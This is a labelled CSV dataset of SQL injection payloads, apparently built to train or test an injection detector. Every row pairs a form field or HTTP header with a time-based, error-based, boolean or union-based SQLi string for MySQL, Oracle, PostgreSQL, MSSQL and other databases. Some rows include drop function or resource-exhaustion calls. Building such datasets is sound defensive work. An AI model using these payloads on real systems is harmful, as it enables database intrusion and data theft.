payload,type,label
address: -8860) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,malicious
"Accept-Encoding: 1"" and (select * from (select(sleep(5)))gcrr)#",sqli,malicious
"zip: -1048%"" or 3038=3038",sqli,malicious
"lname: -2359' union all select 2687,2687,2687#",sqli,malicious
sodienthoai: 1) as wshv where 5684=5684;(select * from (select(sleep(5)))acdk)#,sqli,malicious
email: -4289' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'agnc' like 'agnc,sqli,malicious
User-Agent: 1') as mqxb where 6496=6496 and 7533=7533--,sqli,malicious
"pwd: -3219"") order by 1--",sqli,malicious
"msg: 1%');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,malicious
zip: -6039%')) or 6872=6872 and (('%'=',sqli,malicious
"Accept-Encoding: 1') where 4092=4092 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"postal: 1"")) as riui where 2605=2605;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,malicious
fullname: 1'+(select eluw where 6210=6210;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,malicious
"sodienthoai: 1%' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and '%'='",sqli,malicious
"text: 1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""kzcd""=""kzcd",sqli,malicious
"Accept-Encoding: 1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,malicious
"addr: -9774'))) union all select 6954,6954,6954#",sqli,malicious
"address: 1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso",sqli,malicious
secret: 1'||(select 'ogyu' from dual where 6691=6691;select (case when (8820=4648) then 8820 else 8820*(select 8820 from information_schema.character_sets) end)#,sqli,malicious
phone: 1')) as bswc where 1635=1635 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,malicious
"zipcode: 1) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
phonenumber: 1;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,malicious
"address: 1';select benchmark(5000000,md5(0x714e4153))#",sqli,malicious
number: -2817) where 1212=1212 or 3266=1102,sqli,malicious
"content: -9574') as rxym where 4719=4719 union all select 4719,4719,4719,4719,4719,4719,4719--",sqli,malicious
"pwd: 1')) as ylyq where 2953=2953 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
sodienthoai: -8453))) or 3038=3038,sqli,malicious
"address: 1,(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",sqli,malicious
password: 1') where 6222=6222 or (select * from (select(sleep(5)))ydpu)--,sqli,malicious
"postal: 1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('lyem' like 'lyem",sqli,malicious
"email: -9160') union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",sqli,malicious
"Accept-Language: 1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""stcv""=""stcv",sqli,malicious
"number: 1"") where 5491=5491;begin user_lock.sleep(5); end--",sqli,malicious
"Content-Type: -7412"") as qngt where 2041=2041 union all select 2041--",sqli,malicious
"phonenumber: 1%"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"fullname: 1"")) as vbpl where 3885=3885 and 6969=(select 6969 from pg_sleep(5))--",sqli,malicious
"Accept-Language: 1 where 6100=6100 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"txt: 1""));if(9690=6491) select 9690 else drop function nyln--",sqli,malicious
"email: 1,iif(6333=1227,1,1/0)",sqli,malicious
"User-Agent: 1%') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
"sdt: 1"") where 4951=4951;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,malicious
"Accept-Encoding: 1%"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",sqli,malicious
"content: 1%')));select benchmark(5000000,md5(0x4c4d6142)) and ((('%'='",sqli,malicious
"Accept-Encoding: 1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,malicious
"pass: -3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",sqli,malicious
"secret: 1"") and sleep(5) and (""ytof""=""ytof",sqli,malicious
name: 1' where 6913=6913 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,malicious
"name: 1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",sqli,malicious
"fname: 1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
"text: 1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""kins""=""kins",sqli,malicious
"email: -8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",sqli,malicious
"phone: 1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('gwew' like 'gwew",sqli,malicious
postal: 1)) order by 1#,sqli,malicious
"sdt: -9122) as sdlg where 1546=1546 union all select 1546,1546,1546,1546,1546,1546,1546--",sqli,malicious
"User-Agent: 1"" where 5236=5236 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,malicious
"fname: 1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",sqli,malicious
"pwd: 1"") or sleep(5) and (""fiag"" like ""fiag",sqli,malicious
"text: 1',(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",sqli,malicious
"message: -2009%' union all select 1991,1991#",sqli,malicious
"password: 1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",sqli,malicious
fname: 1') and 2577=7094,sqli,malicious
username: 1' and 5835=6157 and 'bjee' like 'bjee,sqli,malicious
"phonenumber: 1%""));select benchmark(5000000,md5(0x714e4153))#",sqli,malicious
"sodienthoai: -1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",sqli,malicious
"fname: 1)) as nxdf where 1696=1696 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,malicious
"password: 1%' union all select null,null,null,null,null,null,null--",sqli,malicious
phone: 1')) as dqdv where 8126=8126 and 4595=4595#,sqli,malicious
"txt: 1') where 7093=7093 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"text: 1"" and make_set(8262=3471,3471) and ""wayp""=""wayp",sqli,malicious
"zipcode: 1"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"fname: -2610%"") union all select 7779,7779,7779,7779,7779--",sqli,malicious
"Accept-Language: 1%')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"lname: 1'||(select 'uyfo' where 1236=1236 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,malicious
postalcode: -7565') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('gymz'='gymz,sqli,malicious
"phone: 1%"") and 8024=3560--",sqli,malicious
"phone: 1%"")));if(7899=7899) select 7899 else drop function zbbp--",sqli,malicious
zip: -2869')) union all select 3216--,sqli,malicious
"name: 1',(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",sqli,malicious
"code: 1"") as bllz where 6975=6975 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
"Accept-Encoding: 1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",sqli,malicious
"message: 1'))) union all select null,null,null,null,null,null--",sqli,malicious
sdt: -3895') or 8645=5359--,sqli,malicious
"Accept-Encoding: 1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
Content-Type: 1) and 7533=7533,sqli,malicious
"sodienthoai: 1%""))) or sleep(5) and (((""%""=""",sqli,malicious
secret: 1%' and 2006=2006,sqli,malicious
email: 1 rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,malicious
"fullname: 1"") where 4878=4878 and (select * from (select(sleep(5)))fzno)--",sqli,malicious
"text: -6305""))) or 8097=2048 and (((""euyy"" like ""euyy",sqli,malicious
"content: 1"") where 9545=9545 and 9198=9198--",sqli,malicious
"username: 1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""jcgh""=""jcgh",sqli,malicious
"User-Agent: 1',extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",sqli,malicious
"address: 1))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((5199=5199",sqli,malicious
email: -3125'))) order by 1#,sqli,malicious
phone: 1' in boolean mode);waitfor delay '0:0:5'#,sqli,malicious
"code: -5417 or elt(1032=1032,3623)",sqli,malicious
"pwd: 1)) as zykv where 2158=2158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,malicious
"Accept-Encoding: 1)) as xvyi where 6701=6701 union all select null,null,null,null#",sqli,malicious
"message: 1'+(select 'jfir' where 7814=7814 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",sqli,malicious
"zip: -7860'))) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",sqli,malicious
Accept-Encoding: 1'||(select 'lxyu' from dual where 5789=5789 union all select null#,sqli,malicious
"secret: 1') where 3375=3375 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"Content-Type: 1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('xiyl' like 'xiyl",sqli,malicious
"sdt: 1' where 3028=3028;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,malicious
"Accept-Encoding: 1' where 7036=7036;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"Content-Type: 1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
"lname: -1510'))) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",sqli,malicious
postalcode: 1'+(select 'ymgm' where 8204=8204 and sleep(5)#,sqli,malicious
"zipcode: -7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",sqli,malicious
"txt: 1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('%'='",sqli,malicious
"address: 1"") where 8702=8702 union all select null,null,null,null,null--",sqli,malicious
"password: -4205') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,malicious
"fullname: 1""));begin user_lock.sleep(5); end and ((""kvts"" like ""kvts",sqli,malicious
"User-Agent: 1'||(select 'kgfu' from dual where 2607=2607 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,malicious
sdt: 1' where 6003=6003 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,malicious
"content: -9871"") union all select 9082#",sqli,malicious
Content-Type: 1);waitfor delay '0:0:5'--,sqli,malicious
"code: -4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",sqli,malicious
User-Agent: 1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('jryo'='jryo,sqli,malicious
fname: 1') and 9198=9198--,sqli,malicious
"Accept-Encoding: -9958"") as jzvq where 3741=3741 union all select 3741,3741,3741#",sqli,malicious
"addr: -3952') union all select 6644,6644,6644--",sqli,malicious
"fname: 1%"" rlike (select * from (select(sleep(5)))vwyq)#",sqli,malicious
postalcode: 1')) and (select * from (select(sleep(5)))fzno) and (('wevl'='wevl,sqli,malicious
Content-Type: 1));if(7899=7899) select 7899 else drop function zbbp--,sqli,malicious
"password: 1%'))) union all select null,null,null,null,null,null,null,null,null#",sqli,malicious
"addr: -4256') where 9545=9545 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,malicious
"fullname: -3393"")) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",sqli,malicious
"code: 1"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
sdt: 1' where 8482=8482 or sleep(5)#,sqli,malicious
"email: 1%';iif(5257=5257,1,1/0)",sqli,malicious
"msg: 1'+(select 'mxei' where 7811=7811 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,malicious
"msg: 1"") as ypfa where 6128=6128;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,malicious
sdt: -3450' where 4478=4478 or 9323=9323#,sqli,malicious
code: -8057')) as gpue where 4205=4205 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,malicious
"lname: 1') union all select null,null,null,null,null,null,null,null,null,null--",sqli,malicious
"number: -5672%"" or 3825=9675--",sqli,malicious
text: 1' or 4240=(select 4240 from pg_sleep(5))--,sqli,malicious
"phone: 1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh",sqli,malicious
"phone: -2441' union all select 1853,1853,1853,1853,1853,1853,1853--",sqli,malicious
postal: 1%'));select (case when (4006=1276) then 1 else 4006*(select 4006 from master..sysdatabases) end)--,sqli,malicious
"name: 1'||(select 'nbmo' from dual where 5572=5572 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"pass: 1"") and (3020=3020)*6703 and (""hkjf""=""hkjf",sqli,malicious
"username: 1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",sqli,malicious
"zip: 1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('akyc'='akyc",sqli,malicious
lname: (select (case when (3950=2747) then 1 else 1/(select 0) end)),sqli,malicious
sdt: 1) where 6039=6039 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,malicious
Accept-Encoding: -9555'))) or (8459=8459)*4906 and ((('rwpq' like 'rwpq,sqli,malicious
